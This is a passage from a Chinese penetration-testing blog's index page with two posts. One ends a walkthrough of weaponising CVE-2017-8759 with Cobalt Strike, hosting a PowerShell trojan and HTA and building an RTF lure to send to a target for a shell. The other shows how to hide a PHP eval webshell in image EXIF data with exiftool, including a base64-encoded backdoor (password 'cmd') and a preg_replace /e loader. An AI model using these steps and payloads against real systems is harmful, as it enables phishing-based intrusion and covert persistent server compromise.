+<img src="/images/0f4ad09fcc7f849df9d41ba28b009cd8c47f6d11.png" alt="微信截图_20170927155425.png"><br>​	以上两个文档的修改要与cobalt strike相对应</li>
+<li>设置攻击环境：<br>  6.1 <code>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery</code>，启动一个powershell木马，设置如下图：<br>  <img src="/images/3ca379232e73ccf4c29bddeef9a1ed09b20ecbf7.png" alt="微信截图_20170928122539.png"><br>  点击”Launch”之后，会生成一个一句话的Powershell代码，记住其中的网址部分，填写到<code>cmd.jpg</code>中，替换掉url。<br>  6.2 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>，将<code>cmd.jpg</code>，一定要将<code>Mime Type</code>修改为<code>application/hta</code>，此处生成的<code>URL</code>请填入<code>exploit.txt</code>中相应的位置。<br>  6.3 <code>Attacks -&gt; Web Drive-by -&gt; Host File</code>，将<code>exploit.txt</code>，无需特殊设置，设置好<code>Local URI</code>，点击<code>Launch</code>，复制生成的URL。此<code>URL</code>为<code>CreateRTF.py</code>脚本<code>-u</code>参数使用的。<br>  6.3 使用大神的<code>CreatRTF.py</code>生成一个rtf文档，url填写为Host <code>exploit.txt</code>时产生的url。</li>
+</ol>
+<p>至此，步骤完成，将生成的rtf文档发送给目标，即可在cobalt strike teamserver上得到shell。</p>
+<p>##注意事项</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html" class="post-title-link" itemprop="url">利用EXIFTool 隐藏WebShell</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-09-18 11:12:00" itemprop="dateCreated datePublished" datetime="2017-09-18T11:12:00+08:00">2017-09-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/web-sec/" itemprop="url" rel="index"><span itemprop="name">web-sec</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]<br>##意义<br>常见WebShell比较容易识别，利用图片exif信息可以达到隐藏WebShell的目的，以便持久化。（当然，这不是持久化的最好方法，不过作为临时持久化方法还是可以试试的）</p>
+<p>##工具</p>
+<ol>
+<li>ExifTool</li>
+<li>一句话木马</li>
+<li>中国菜刀客户端</li>
+<li>图片</li>
+</ol>
+<p>##步骤</p>
+<ol>
+<li><p>跟度娘要一张喜欢的图片<br>  略了</p>
+</li>
+<li><p>安装ExifTool<br>  2.1 环境Kali<br>  2.2 命令：apt-get install exiftool</p>
+</li>
+<li><p>向图片中写入一句话木马<br>  执行命令：<br>  <code>exiftool &quot;-comment=&lt;test.php timg.jpg&quot;</code><br>  <code>exiftool &quot;-model=/.*/e&quot; timg.jpg</code><br>  字符串：<br>  aWYgKGlzc2V0KCRfUE9TVFsiY21kIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJjbWQiXSkpO30&#x3D;<br>  Base64解码之后的东西，我就补贴出来了，总之密码是cmd<br>  执行结果如下：<br>  <img src="/images/700275c77a5c6cf8c104892eec10f84475b03ad8.png" alt="微信截图_20170918185956.png"><br>  可以看到我们的一句话木马就写到了图片信息当中</p>
+</li>
+<li><p>修改版一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$exif</span> = <span class="title function_ invoke__">exif_read_data</span>(<span class="string">&#x27;/www/web/phpshell_google_com/public_html/timg.jpg&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="variable">$exif</span>[Model],<span class="variable">$exif</span>[Make],<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>GetShell<br>  <img src="/images/abc51c58dadcc228ff13b9e07e8b08b51116c0a3.png" alt="微信截图_20170918191022.png"></p>
+</li>
+</ol>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>[1] 图片路径可以是绝对路径，也可以是相对路径，如果是相对路径不要忘记<code>./</code>符号哦<br>[2] 测试PHP版本为5.5.根据大牛提示，preg_replace函数的<code>/e</code>选项在<code>&gt;5.6</code>版本中废除，不过也有别的函数替代。思路是对的，注意函数使用。<br>[3] 不要长时间盯着苍老师的图片看，图有魔性~~<br>##参考<br>[1] <a target="_blank" rel="noopener" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/">https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/</a><br>[2] <a target="_blank" rel="noopener" href="https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
